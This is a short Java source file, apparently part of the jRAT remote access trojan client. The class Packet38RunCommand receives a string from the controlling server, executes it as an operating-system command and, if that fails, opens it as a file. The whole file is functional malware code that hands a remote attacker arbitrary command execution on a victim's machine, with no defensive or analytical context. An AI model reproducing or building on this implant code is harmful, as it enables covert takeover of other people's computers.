package jrat.client.packets.incoming;

import jrat.client.Connection;

import java.awt.*;
import java.io.File;


public class Packet38RunCommand implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String process = con.readLine();
		try {
			Runtime.getRuntime().exec(process);
		} catch (Exception ex) {
			ex.printStackTrace();
			try {
				Desktop.getDesktop().open(new File(process));
			} catch (Exception ex1) {
				ex1.printStackTrace();
			}
		}
	}

}
